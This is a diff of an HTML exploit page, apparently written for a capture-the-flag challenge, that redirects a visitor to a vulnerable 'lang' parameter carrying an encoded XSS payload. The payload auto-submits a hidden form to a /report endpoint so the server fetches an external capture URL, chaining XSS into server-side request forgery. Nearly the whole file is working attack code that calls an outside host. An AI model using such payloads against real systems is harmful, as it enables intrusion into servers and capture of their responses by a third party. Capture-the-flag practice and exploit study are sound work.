@@ -1,38 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Safe SSRF Exploit</title>
+    <title>Encoded SSRF Exploit</title>
     <script>
-        // Inject XSS payload into the vulnerable endpoint
-        const xssPayload = `
-            alert("[Debug] XSS executed!");
-            console.log("[Debug] Injecting SSRF payload...");
+        // Define the XSS payload with proper encoding for the vulnerable 'lang' parameter
+        const xssPayload = `"; alert("[Debug] XSS executed successfully!"); console.log("[Debug] Injecting SSRF payload into /report...");
 
-            // Create a form to submit the SSRF payload to /report
+            // Start creating the malicious form
             const form = document.createElement('form');
             form.method = 'POST';
-            form.action = '/report';
+            form.action = '/report'; // Vulnerable endpoint
 
-            // Add the URL input targeting your capture endpoint
+            // Create a hidden input field with the URL targeting the attacker's endpoint
             const urlInput = document.createElement('input');
             urlInput.type = 'hidden';
             urlInput.name = 'url';
-            urlInput.value = 'https://ssrf-eta.vercel.app/api/capture'; // External URL for testing
+            urlInput.value = 'https://ssrf-eta.vercel.app/api/capture'; // External URL for capturing SSRF
+
+            // Append the input field to the form
             form.appendChild(urlInput);
 
-            // Automatically submit the form
+            // Debug: Log the form details before submitting
+            console.log("[Debug] Form created:", form);
+
+            // Automatically append the form to the body and submit it
             document.body.appendChild(form);
             form.submit();
+
+            // Debug: Log confirmation after form submission
+            console.log("[Debug] Form submitted successfully."); //
         `;
 
-        // Vulnerable endpoint with the XSS injection
-        const targetUrl = 'http://chal1.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
+        // Construct the URL for the vulnerable endpoint with the properly encoded XSS payload
+        const targetUrl = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
 
-        // Redirect to the vulnerable endpoint
+        // Debug: Log the constructed target URL
+        console.log("[Debug] Redirecting to vulnerable endpoint:", targetUrl);
+
+        // Redirect to the vulnerable endpoint to execute the payload
         window.location.href = targetUrl;
     </script>
 </head>
 <body>
-    <p>Redirecting to exploit SSRF...</p>
+    <p>Redirecting to exploit SSRF... Check your debugger or logs for detailed execution.</p>
 </body>
 </html>
